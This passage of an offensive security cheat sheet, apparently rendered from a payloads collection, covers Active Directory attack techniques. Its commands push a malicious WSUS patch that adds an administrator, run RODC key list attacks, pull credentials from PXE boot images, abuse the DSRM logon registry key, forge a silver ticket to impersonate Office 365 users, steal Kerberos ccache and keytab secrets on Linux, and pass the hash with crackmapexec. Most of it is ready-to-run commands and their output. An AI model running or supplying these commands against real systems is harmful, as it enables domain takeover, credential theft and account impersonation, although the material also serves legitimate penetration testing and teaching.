<li>Locate using <code>HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate</code> or <code>SharpWSUS.exe locate</code></li>
<li>After WSUS Server compromise: <code>SharpWSUS.exe inspect</code></li>
<li>Create a malicious patch: <code>SharpWSUS.exe create /payload:&quot;C:\Users\ben\Documents\pk\psexec.exe&quot; /args:&quot;-accepteula -s -d cmd.exe /c \&quot;net user WSUSDemo Password123! /add ^&amp; net localgroup administrators WSUSDemo /add\&quot;&quot; /title:&quot;WSUSDemo&quot;</code></li>
<li>Deploy it on the target: <code>SharpWSUS.exe approve /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local /groupname:&quot;Demo Group&quot;</code></li>
<li>Check status deployment: <code>SharpWSUS.exe check /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local</code></li>
<li>Clean up: <code>SharpWSUS.exe delete /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local /groupname:”Demo Group</code></li>
</ol>
<h3 id="rodc---read-only-domain-controller-compromise">
  RODC - Read Only Domain Controller Compromise
  <a class="anchor" href="#rodc---read-only-domain-controller-compromise">#</a>
</h3>
<blockquote>
<p>If the user is included in the <strong>Allowed RODC Password Replication</strong>, their credentials are stored in the server, and the <strong>msDS-RevealedList</strong> attribute of the RODC is populated with the username.</p>
</blockquote>
<p><strong>Requirements</strong>:</p>
<ul>
<li><a href="https://github.com/SecureAuthCorp/impacket/pull/1210">Impacket PR #1210 - The Kerberos Key List Attack</a></li>
<li><strong>krbtgt</strong> credentials of the RODC (-rodcKey)</li>
<li><strong>ID of the krbtgt</strong> account of the RODC (-rodcNo)</li>
</ul>
<p><strong>Exploitation</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span><span style="color:#75715e"># keylistattack.py using SAMR user enumeration without filtering (-full flag)</span>
</span></span><span style="display:flex;"><span>keylistattack.py DOMAIN/user<span style="color:#960050;background-color:#1e0010">:</span>password@host -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX -full
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># keylistattack.py defining a target username (-t flag)</span>
</span></span><span style="display:flex;"><span>keylistattack.py -kdc sever.domain.local -t user -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX LIST
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># secretsdump.py using the Kerberos Key List Attack option (-use-keylist)</span>
</span></span><span style="display:flex;"><span>secretsdump.py DOMAIN/user<span style="color:#960050;background-color:#1e0010">:</span>password@host -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX -use-keylist
</span></span></code></pre></div><h3 id="pxe-boot-image-attack">
  PXE Boot image attack
  <a class="anchor" href="#pxe-boot-image-attack">#</a>
</h3>
<p>PXE allows a workstation to boot from the network by retrieving an operating system image from a server using TFTP (Trivial FTP) protocol. This boot over the network allows an attacker to fetch the image and interact with it.</p>
<ul>
<li>
<p>Press <strong>[F8]</strong> during the PXE boot to spawn an administrator console on the deployed machine.</p>
</li>
<li>
<p>Press <strong>[SHIFT+F10]</strong> during the initial Windows setup process to bring up a system console, then add a local administrator or dump SAM/SYSTEM registry.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>net user hacker Password123! /add
</span></span><span style="display:flex;"><span>net localgroup administrators /add hacker
</span></span></code></pre></div></li>
<li>
<p>Extract the pre-boot image (wim files) using <a href="https://github.com/wavestone-cdt/powerpxe">PowerPXE.ps1 (https://github.com/wavestone-cdt/powerpxe)</a> and dig through it to find default passwords and domain accounts.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Import the module</span>
</span></span><span style="display:flex;"><span>PS &gt; Import-Module .\PowerPXE.ps1
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Start the exploit on the Ethernet interface</span>
</span></span><span style="display:flex;"><span>PS &gt; Get-PXEcreds -InterfaceAlias Ethernet
</span></span><span style="display:flex;"><span>PS &gt; Get-PXECreds -InterfaceAlias <span style="color:#960050;background-color:#1e0010">«</span> lab <span style="color:#ae81ff">0</span> <span style="color:#960050;background-color:#1e0010">»</span> 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Wait for the DHCP to get an address</span>
</span></span><span style="display:flex;"><span>&gt;&gt; Get a valid IP address
</span></span><span style="display:flex;"><span>&gt;&gt;&gt; &gt;&gt;&gt; DHCP proposal IP address<span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">192.168</span>.22.101
</span></span><span style="display:flex;"><span>&gt;&gt;&gt; &gt;&gt;&gt; DHCP Validation<span style="color:#960050;background-color:#1e0010">:</span> DHCPACK
</span></span><span style="display:flex;"><span>&gt;&gt;&gt; &gt;&gt;&gt; IP address configured<span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">192.168</span>.22.101
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Extract BCD path from the DHCP response</span>
</span></span><span style="display:flex;"><span>&gt;&gt; Request BCD File path
</span></span><span style="display:flex;"><span>&gt;&gt;&gt; &gt;&gt;&gt; BCD File path<span style="color:#960050;background-color:#1e0010">:</span>  \Tmp\x86x64{5AF4E332-C90A-<span style="color:#ae81ff">4015</span>-9BA2-F8A7C9FF04E6}.bcd
</span></span><span style="display:flex;"><span>&gt;&gt;&gt; &gt;&gt;&gt; TFTP IP Address<span style="color:#960050;background-color:#1e0010">:</span>  <span style="color:#ae81ff">192.168</span>.22.3
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Download the BCD file and extract wim files</span>
</span></span><span style="display:flex;"><span>&gt;&gt; Launch TFTP download
</span></span><span style="display:flex;"><span>&gt;&gt;&gt;&gt; Transfer succeeded.
</span></span><span style="display:flex;"><span>&gt;&gt; Parse the BCD file<span style="color:#960050;background-color:#1e0010">:</span> conf.bcd
</span></span><span style="display:flex;"><span>&gt;&gt;&gt;&gt; Identify wim file <span style="color:#960050;background-color:#1e0010">:</span> \Boot\x86\Images\LiteTouchPE_x86.wim
</span></span><span style="display:flex;"><span>&gt;&gt;&gt;&gt; Identify wim file <span style="color:#960050;background-color:#1e0010">:</span> \Boot\x64\Images\LiteTouchPE_x64.wim
</span></span><span style="display:flex;"><span>&gt;&gt; Launch TFTP download
</span></span><span style="display:flex;"><span>&gt;&gt;&gt;&gt; Transfer succeeded.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Parse wim files to find interesting data</span>
</span></span><span style="display:flex;"><span>&gt;&gt; Open LiteTouchPE_x86.wim
</span></span><span style="display:flex;"><span>&gt;&gt;&gt;&gt; Finding Bootstrap.ini
</span></span><span style="display:flex;"><span>&gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; DeployRoot = \\LAB-MDT\DeploymentShare$
</span></span><span style="display:flex;"><span>&gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; UserID = MdtService
</span></span><span style="display:flex;"><span>&gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; UserPassword = Somepass1
</span></span></code></pre></div></li>
</ul>
<h3 id="dns-reconnaissance">
  DNS Reconnaissance
  <a class="anchor" href="#dns-reconnaissance">#</a>
</h3>
<p>Perform ADIDNS searches</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>StandIn.exe --dns --limit <span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span>StandIn.exe --dns --filter SQL --limit <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span>StandIn.exe --dns --forest --domain redhook --user RFludd --pass Cl4vi$Alchemi4e
</span></span><span style="display:flex;"><span>StandIn.exe --dns --legacy --domain redhook --user RFludd --pass Cl4vi$Alchemi4e
</span></span></code></pre></div><h3 id="dsrm-credentials">
  DSRM Credentials
  <a class="anchor" href="#dsrm-credentials">#</a>
</h3>
<blockquote>
<p>Directory Services Restore Mode (DSRM) is a safe mode boot option for Windows Server domain controllers. DSRM allows an administrator to repair or recover to repair or restore an Active Directory database.</p>
</blockquote>
<p>This is the local administrator account inside each DC. Having admin privileges in this machine, you can use mimikatz to dump the local Administrator hash. Then, modifying a registry to activate this password so you can remotely access to this local Administrator user.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Invoke-Mimikatz -Command <span style="color:#e6db74">&#39;&#34;token::elevate&#34; &#34;lsadump::sam&#34;&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Check if the key exists and get the value</span>
</span></span><span style="display:flex;"><span>Get-ItemProperty <span style="color:#e6db74">&#34;HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA&#34;</span> -name DsrmAdminLogonBehavior 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create key with value &#34;2&#34; if it doesn&#39;t exist</span>
</span></span><span style="display:flex;"><span>New-ItemProperty <span style="color:#e6db74">&#34;HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA&#34;</span> -name DsrmAdminLogonBehavior -value <span style="color:#ae81ff">2</span> -PropertyType DWORD 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Change value to &#34;2&#34;</span>
</span></span><span style="display:flex;"><span>Set-ItemProperty <span style="color:#e6db74">&#34;HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA&#34;</span> -name DsrmAdminLogonBehavior -value <span style="color:#ae81ff">2</span>
</span></span></code></pre></div><h3 id="impersonating-office-365-users-on-azure-ad-connect">
  Impersonating Office 365 Users on Azure AD Connect
  <a class="anchor" href="#impersonating-office-365-users-on-azure-ad-connect">#</a>
</h3>
<p>Prerequisites:</p>
<ul>
<li>
<p>Obtain NTLM password hash of the AZUREADSSOACC account</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>mimikatz.exe <span style="color:#e6db74">&#34;lsadump::dcsync /user:AZUREADSSOACC$&#34;</span> exit
</span></span></code></pre></div></li>
<li>
<p>AAD logon name of the user we want to impersonate (userPrincipalName or mail)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>elrond@contoso.com
</span></span></code></pre></div></li>
<li>
<p>SID of the user we want to impersonate</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">21</span>-<span style="color:#ae81ff">2121516926</span>-<span style="color:#ae81ff">2695913149</span>-<span style="color:#ae81ff">3163778339</span>-<span style="color:#ae81ff">1234</span>
</span></span></code></pre></div></li>
</ul>
<p>Create the Silver Ticket and inject it into Kerberos cache:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>mimikatz.exe <span style="color:#e6db74">&#34;kerberos::golden /user:elrond
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/domain:contoso.local /rc4:f9969e088b2c13d93833d0ce436c76dd
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/target:aadg.windows.net.nsatc.net /service:HTTP /ptt&#34;</span> exit
</span></span></code></pre></div><p>Launch Mozilla Firefox, go to about:config</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>network.negotiate-auth.trusted-uris=<span style="color:#e6db74">&#34;https://aadg.windows.net.nsatc.net,https://autologon.microsoftazuread-sso.com&#34;</span>.
</span></span></code></pre></div><p>Navigate to any web application that is integrated with our AAD domain. Once at the Office365 logon screen, fill in the user name, while leaving the password field empty. Then press TAB or ENTER.</p>
<h2 id="linux-active-directory">
  Linux Active Directory
  <a class="anchor" href="#linux-active-directory">#</a>
</h2>
<h3 id="ccache-ticket-reuse-from-tmp">
  CCACHE ticket reuse from /tmp
  <a class="anchor" href="#ccache-ticket-reuse-from-tmp">#</a>
</h3>
<blockquote>
<p>When tickets are set to be stored as a file on disk, the standard format and type is a CCACHE file. This is a simple binary file format to store Kerberos credentials. These files are typically stored in /tmp and scoped with 600 permissions</p>
</blockquote>
<p>List the current ticket used for authentication with <code>env | grep KRB5CCNAME</code>. The format is portable and the ticket can be reused by setting the environment variable with <code>export KRB5CCNAME=/tmp/ticket.ccache</code>. Kerberos ticket name format is <code>krb5cc_%{uid}</code> where uid is the user UID.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$ ls /tmp/ | grep krb5cc
</span></span><span style="display:flex;"><span>krb5cc_1000
</span></span><span style="display:flex;"><span>krb5cc_1569901113
</span></span><span style="display:flex;"><span>krb5cc_1569901115
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ export KRB5CCNAME=/tmp/krb5cc_1569901115
</span></span></code></pre></div><h3 id="ccache-ticket-reuse-from-keyring">
  CCACHE ticket reuse from keyring
  <a class="anchor" href="#ccache-ticket-reuse-from-keyring">#</a>
</h3>
<p>Tool to extract Kerberos tickets from Linux kernel keys : <a href="https://github.com/TarlogicSecurity/tickey">https://github.com/TarlogicSecurity/tickey</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Configuration and build</span>
</span></span><span style="display:flex;"><span>git clone https<span style="color:#960050;background-color:#1e0010">:</span>//github.com/TarlogicSecurity/tickey
</span></span><span style="display:flex;"><span>cd tickey/tickey
</span></span><span style="display:flex;"><span>make CONF=Release
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[root@Lab-LSV01 /]<span style="color:#75715e"># /tmp/tickey -i</span>
</span></span><span style="display:flex;"><span>[*] krb5 ccache_name = KEYRING<span style="color:#960050;background-color:#1e0010">:</span>session<span style="color:#960050;background-color:#1e0010">:</span>sess_%{uid}
</span></span><span style="display:flex;"><span>[+] root detected, so... DUMP ALL THE TICKETS!!
</span></span><span style="display:flex;"><span>[*] Trying to inject <span style="color:#66d9ef">in</span> tarlogic[<span style="color:#ae81ff">1000</span>] session...
</span></span><span style="display:flex;"><span>[+] Successful injection at <span style="color:#66d9ef">process</span> <span style="color:#ae81ff">25723</span> of tarlogic[<span style="color:#ae81ff">1000</span>],look <span style="color:#66d9ef">for</span> tickets <span style="color:#66d9ef">in</span> /tmp/__krb_1000.ccache
</span></span><span style="display:flex;"><span>[*] Trying to inject <span style="color:#66d9ef">in</span> velociraptor[<span style="color:#ae81ff">1120601115</span>] session...
</span></span><span style="display:flex;"><span>[+] Successful injection at <span style="color:#66d9ef">process</span> <span style="color:#ae81ff">25794</span> of velociraptor[<span style="color:#ae81ff">1120601115</span>],look <span style="color:#66d9ef">for</span> tickets <span style="color:#66d9ef">in</span> /tmp/__krb_1120601115.ccache
</span></span><span style="display:flex;"><span>[*] Trying to inject <span style="color:#66d9ef">in</span> trex[<span style="color:#ae81ff">1120601113</span>] session...
</span></span><span style="display:flex;"><span>[+] Successful injection at <span style="color:#66d9ef">process</span> <span style="color:#ae81ff">25820</span> of trex[<span style="color:#ae81ff">1120601113</span>],look <span style="color:#66d9ef">for</span> tickets <span style="color:#66d9ef">in</span> /tmp/__krb_1120601113.ccache
</span></span><span style="display:flex;"><span>[<span style="color:#66d9ef">X</span>] [uid<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">0</span>] Error retrieving tickets
</span></span></code></pre></div><h3 id="ccache-ticket-reuse-from-sssd-kcm">
  CCACHE ticket reuse from SSSD KCM
  <a class="anchor" href="#ccache-ticket-reuse-from-sssd-kcm">#</a>
</h3>
<p>SSSD maintains a copy of the database at the path <code>/var/lib/sss/secrets/secrets.ldb</code>.
The corresponding key is stored as a hidden file at the path <code>/var/lib/sss/secrets/.secrets.mkey</code>.
By default, the key is only readable if you have <strong>root</strong> permissions.</p>
<p>Invoking <code>SSSDKCMExtractor</code> with the &ndash;database and &ndash;key parameters will parse the database and decrypt the secrets.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>git clone https<span style="color:#960050;background-color:#1e0010">:</span>//github.com/fireeye/SSSDKCMExtractor
</span></span><span style="display:flex;"><span>python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
</span></span></code></pre></div><p>The credential cache Kerberos blob can be converted into a usable Kerberos CCache file that can be passed to Mimikatz/Rubeus.</p>
<h3 id="ccache-ticket-reuse-from-keytab">
  CCACHE ticket reuse from keytab
  <a class="anchor" href="#ccache-ticket-reuse-from-keytab">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>git clone https<span style="color:#960050;background-color:#1e0010">:</span>//github.com/its-a-feature/KeytabParser
</span></span><span style="display:flex;"><span>python KeytabParser.py /etc/krb5.keytab
</span></span><span style="display:flex;"><span>klist -k /etc/krb5.keytab
</span></span></code></pre></div><h3 id="extract-accounts-from-etckrb5keytab">
  Extract accounts from /etc/krb5.keytab
  <a class="anchor" href="#extract-accounts-from-etckrb5keytab">#</a>
</h3>
<p>The service keys used by services that run as root are usually stored in the keytab file /etc/krb5.keytab. This service key is the equivalent of the service&rsquo;s password, and must be kept secure.</p>
<p>Use <a href="https://adoptopenjdk.net/?variant=openjdk13&amp;jvmVariant=hotspot"><code>klist</code></a> to read the keytab file and parse its content. The key that you see when the <a href="https://cwiki.apache.org/confluence/display/DIRxPMGT/Kerberos&#43;EncryptionKey">key type</a> is 23  is the actual NT Hash of the user.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$ klist.exe -t -K -e -k FILE<span style="color:#960050;background-color:#1e0010">:</span>C:\Users\User\downloads\krb5.keytab
</span></span><span style="display:flex;"><span>[...]
</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">26</span>] Service principal<span style="color:#960050;background-color:#1e0010">:</span> host/COMPUTER@DOMAIN
</span></span><span style="display:flex;"><span>	 KVNO<span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">25</span>
</span></span><span style="display:flex;"><span>	 Key type<span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">23</span>
</span></span><span style="display:flex;"><span>	 Key<span style="color:#960050;background-color:#1e0010">:</span> 31d6cfe0d16ae931b73c59d7e0c089c0
</span></span><span style="display:flex;"><span>	 Time stamp<span style="color:#960050;background-color:#1e0010">:</span> Oct <span style="color:#ae81ff">07</span>,  <span style="color:#ae81ff">2019</span> <span style="color:#ae81ff">09</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">12</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">02</span>
</span></span><span style="display:flex;"><span>[...]
</span></span></code></pre></div><p>On Linux you can use <a href="https://github.com/sosdave/KeyTabExtract"><code>KeyTabExtract</code></a>: we want RC4 HMAC hash to reuse the NLTM hash.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$ python3 keytabextract.py krb5.keytab 
</span></span><span style="display:flex;"><span>[!] No RC4-HMAC located. Unable to extract NTLM hashes. <span style="color:#75715e"># No luck</span>
</span></span><span style="display:flex;"><span>[+] Keytab File successfully imported.
</span></span><span style="display:flex;"><span>        REALM <span style="color:#960050;background-color:#1e0010">:</span> DOMAIN
</span></span><span style="display:flex;"><span>        SERVICE PRINCIPAL <span style="color:#960050;background-color:#1e0010">:</span> host/computer.domain
</span></span><span style="display:flex;"><span>        NTLM HASH <span style="color:#960050;background-color:#1e0010">:</span> 31d6cfe0d16ae931b73c59d7e0c089c0 <span style="color:#75715e"># Lucky</span>
</span></span></code></pre></div><p>On macOS you can use <code>bifrost</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>./bifrost -action dump -source keytab -path test
</span></span></code></pre></div><p>Connect to the machine using the account and the hash with CME.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$ crackmapexec <span style="color:#ae81ff">10</span>.XXX.XXX.XXX -u <span style="color:#e6db74">&#39;COMPUTER$&#39;</span> -H <span style="color:#e6db74">&#34;31d6cfe0d16ae931b73c59d7e0c089c0&#34;</span> -d <span style="color:#e6db74">&#34;DOMAIN&#34;</span>
</span></span><span style="display:flex;"><span>CME          <span style="color:#ae81ff">10</span>.XXX.XXX.XXX<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">445</span> HOSTNAME-<span style="color:#ae81ff">01</span>   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae931b73c59d7e0c089c0  
</span></span></code></pre></div><h2 id="references">
  References
  <a class="anchor" href="#references">#</a>
</h2>
<ul>
<li><a href="https://www.roguelynn.com/words/explain-like-im-5-kerberos/">Explain like I’m 5: Kerberos - Apr 2, 2013 - @roguelynn</a></li>
<li><a href="#https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/">Impersonating Office 365 Users With Mimikatz - January 15, 2017 - Michael Grafnetter</a></li>
<li><a href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin">Abusing Exchange: One API call away from Domain Admin - Dirk-jan Mollema</a></li>
<li><a href="https://www.exploit-db.com/docs/english/45051-abusing-kerberos---kerberoasting.pdf">Abusing Kerberos: Kerberoasting - Haboob Team</a></li>
<li><a href="https://alsid.com/company/news/abusing-s4u2self-another-sneaky-active-directory-persistence">Abusing S4U2Self: Another Sneaky Active Directory Persistence - Alsid</a></li>
<li><a href="https://blog.netspi.com/attacks-against-windows-pxe-boot-images/">Attacks Against Windows PXE Boot Images - February 13th, 2018 - Thomas Elling</a></li>
<li><a href="https://1337red.wordpress.com/building-and-attacking-an-active-directory-lab-with-powershell/">BUILDING AND ATTACKING AN ACTIVE DIRECTORY LAB WITH POWERSHELL - @myexploit2600 &amp; @5ub34x</a></li>
<li><a href="https://chryzsh.gitbooks.io/darthsidious/content/building-a-lab/building-a-lab/building-a-small-lab.html">Becoming Darth Sidious: Creating a Windows Domain (Active Directory) and hacking it - @chryzsh</a></li>
<li><a href="https://microsoftrnd.co.il/Press%20Kit/BlueHat%20IL%20Decks/BenjaminDelpy.pdf">BlueHat IL - Benjamin Delpy</a></li>
<li><a href="https://connect.ed-diamond.com/MISC/MISC-103/Compromission-des-postes-de-travail-grace-a-LAPS-et-PXE">COMPROMISSION DES POSTES DE TRAVAIL GRÂCE À LAPS ET PXE MISC n° 103 - mai 2019 - Rémi Escourrou, Cyprien Oger </a></li>
<li><a href="https://github.com/l0ss/Chump2Trump/blob/master/ChumpToTrump.pdf">Chump2Trump - AD Privesc talk at WAHCKon 2017 - @l0ss</a></li>
<li><a href="https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/">DiskShadow The return of VSS Evasion Persistence and AD DB extraction</a></li>
<li><a href="https://hausec.com/2017/10/21/domain-penetration-testing-using-bloodhound-crackmapexec-mimikatz-to-get-domain-admin/">Domain Penetration Testing: Using BloodHound, Crackmapexec, &amp; Mimikatz to get Domain Admin</a></li>
<li><a href="https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/">Dumping Domain Password Hashes - Pentestlab</a></li>
<li><a href="https://zachgrace.com/posts/exploiting-ms14-068/">Exploiting MS14-068 with PyKEK and Kali - 14 DEC 2014 - ZACH GRACE @ztgrace</a></li>
<li><a href="https://chryzsh.github.io/exploiting-privexchange/">Exploiting PrivExchange - April 11, 2019 - @chryzsh</a></li>
<li><a href="https://www.riccardoancarani.it/exploiting-unconstrained-delegation/">Exploiting Unconstrained Delegation - Riccardo Ancarani - 28 APRIL 2019</a></li>
<li><a href="https://adsecurity.org/?p=2288">Finding Passwords in SYSVOL &amp; Exploiting Group Policy Preferences</a></li>
<li><a href="https://adsecurity.org/?p=2011">How Attackers Use Kerberos Silver Tickets to Exploit Systems - Sean Metcalf</a></li>
<li><a href="https://speakerdeck.com/ropnop/fun-with-ldap-kerberos-and-msrpc-in-ad-environments">Fun with LDAP, Kerberos (and MSRPC) in AD Environments</a></li>
<li><a href="https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html">Getting the goods with CrackMapExec: Part 1, by byt3bl33d3r</a></li>
<li><a href="https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-2.html">Getting the goods with CrackMapExec: Part 2, by byt3bl33d3r</a></li>
<li><a href="https://pentestlab.blog/2018/04/09/golden-ticket/">Golden ticket - Pentestlab</a></li>
<li><a href="https://bluescreenofjeff.com/2017-05-23-how-to-pass-the-ticket-through-ssh-tunnels/">How To Pass the Ticket Through SSH Tunnels - bluescreenofjeff</a></li>
<li><a href="https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1">Hunting in Active Directory: Unconstrained Delegation &amp; Forests Trusts - Roberto Rodriguez - Nov 28, 2018</a></li>
<li><a href="https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/">Invoke-Kerberoast - Powersploit Read the docs</a></li>
<li><a href="https://room362.com/post/2016/kerberoast-pt1/">Kerberoasting - Part 1 - Mubix “Rob” Fuller</a></li>
<li><a href="https://michael-eder.net/post/2018/native_rdp_pass_the_hash/">Passing the hash with native RDP client (mstsc.exe)</a></li>
<li><a href="https://blog.varonis.com/pen-testing-active-directory-environments-part-introduction-crackmapexec-powerview/">Pen Testing Active Directory Environments - Part I: Introduction to crackmapexec (and PowerView)</a></li>
<li><a href="https://blog.varonis.com/pen-testing-active-directory-environments-part-ii-getting-stuff-done-with-powerview/">Pen Testing Active Directory Environments - Part II: Getting Stuff Done With PowerView</a></li>
<li><a href="https://blog.varonis.com/pen-testing-active-directory-environments-part-iii-chasing-power-users/">Pen Testing Active Directory Environments - Part III:  Chasing Power Users</a></li>
<li><a href="https://blog.varonis.com/pen-testing-active-directory-environments-part-iv-graph-fun/">Pen Testing Active Directory Environments - Part IV: Graph Fun</a></li>
<li><a href="https://blog.varonis.com/pen-testing-active-directory-v-admins-graphs/">Pen Testing Active Directory Environments - Part V: Admins and Graphs</a></li>
<li><a href="https://blog.varonis.com/pen-testing-active-directory-part-vi-final-case/">Pen Testing Active Directory Environments - Part VI: The Final Case</a></li>
<li><a href="https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/">Penetration Testing Active Directory, Part I - March 5, 2019 - Hausec</a></li>
<li><a href="https://hausec.com/2019/03/12/penetration-testing-active-directory-part-ii/">Penetration Testing Active Directory, Part II - March 12, 2019 - Hausec</a></li>
<li><a href="https://0metasecurity.com/post-oscp-part-2/">Post-OSCP Series Part 2 - Kerberoasting - 16 APRIL 2019 - Jon Hickman</a></li>
<li><a href="https://stealingthe.network/quick-guide-to-installing-bloodhound-in-kali-rolling/">Quick Guide to Installing Bloodhound in Kali-Rolling - James Smith</a></li>
<li><a href="http://blog.redxorblue.com/2019/01/red-teaming-made-easy-with-exchange.html">Red Teaming Made Easy with Exchange Privilege Escalation and PowerPriv - Thursday, January 31, 2019 - Dave</a></li>
<li><a href="https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/">Roasting AS-REPs - January 17, 2017 - harmj0y</a></li>
